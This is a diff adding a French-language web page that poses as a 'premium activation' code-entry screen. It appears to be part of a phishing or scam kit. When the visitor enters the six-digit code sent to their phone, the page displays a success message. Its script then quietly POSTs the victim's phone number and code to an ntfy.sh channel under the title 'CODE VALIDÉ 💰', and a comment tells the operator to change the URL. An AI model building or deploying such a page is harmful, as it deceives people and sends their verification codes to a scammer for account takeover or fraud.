@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Code</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@500;700&display=swap');
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif;}
+        body{background:#0a0a0a;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
+        .box{background:#111;border-radius:25px;max-width:420px;width:100%;padding:40px 30px;text-align:center;}
+        h1{font-size:28px;margin-bottom:20px;}
+        .digits{display:flex;gap:12px;justify-content:center;margin:40px 0;}
+        .digits input{width:55px;height:65px;font-size:28px;text-align:center;background:#000;border:2px solid #333;border-radius:15px;color:#fff;}
+        .btn{background:#ffd700;color:#000;font-weight:700;padding:18px;border-radius:15px;width:100%;border:none;cursor:pointer;}
+        .ok{color:#00ff00;font-size:22px;margin-top:30px;display:none;}
+    </style>
+</head>
+<body>
+<div class="box">
+    <h1>Entre le code reçu</h1>
+    <p>Envoyé au <strong id="num"></strong></p>
+    <div class="digits">
+        <input type="text" maxlength="1"><input type="text" maxlength="1"><input type="text" maxlength="1">
+        <input type="text" maxlength="1"><input type="text" maxlength="1"><input type="text" maxlength="1">
+    </div>
+    <button class="btn">Vérifier</button>
+    <div class="ok" id="ok">Félicitations !! Ton premium est activé !</div>
+</div>
+
+<script>
+const NTFY_OK = "https://ntfy.sh/ton-ok-2025"; // CHANGE ICI
+document.getElementById('num').textContent = localStorage.getItem('phone');
+
+const inputs=document.querySelectorAll('.digits input');
+inputs.forEach((i,idx)=>{i.addEventListener('input',()=>{if(i.value&&idx<5)inputs[idx+1].focus();});});
+
+document.querySelector('.btn').addEventListener('click',()=>{
+    let e=Array.from(inputs).map(x=>x.value).join('');
+    if(e===localStorage.getItem('code')){
+        document.getElementById('ok').style.display='block';
+        fetch(NTFY_OK,{method:'POST',headers:{'Title':'CODE VALIDÉ 💰'},body:`Numéro: ${localStorage.getItem('phone')}\nCode tapé: ${e} (correct)`});
+    }
+});
+</script>
+</body>
+</html>
